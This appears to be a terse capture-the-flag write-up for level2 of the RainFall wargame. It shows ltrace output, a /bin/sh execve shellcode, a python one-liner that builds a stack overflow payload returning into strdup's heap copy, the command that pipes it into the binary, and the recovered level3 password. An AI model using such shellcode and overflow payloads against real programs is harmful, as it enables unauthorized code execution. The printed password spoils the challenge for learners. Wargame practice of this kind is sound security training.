```
   evel2@RainFall:~$ ltrace ./level2 
   __libc_start_main(0x804853f, 1, 0xbffff804, 0x8048550, 0x80485c0 <unfinished ...>
   fflush(0xb7fd1a20) = 0
   gets(0xbffff70c, 0, 0, 0xb7e5ec73, 0x80482b5) = 0xbffff70c
   puts("") = 1
   strdup("") = 0x0804a008
   +++ exited (status 8) +++
```

```
shellcode="\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
```

python -c 'print("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*59 + "\x08\xa0\x04\x08")' > /tmp/hh

(cat /tmp/hh; cat) | ./level2



```
   cat /home/user/level3/.pass
   492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```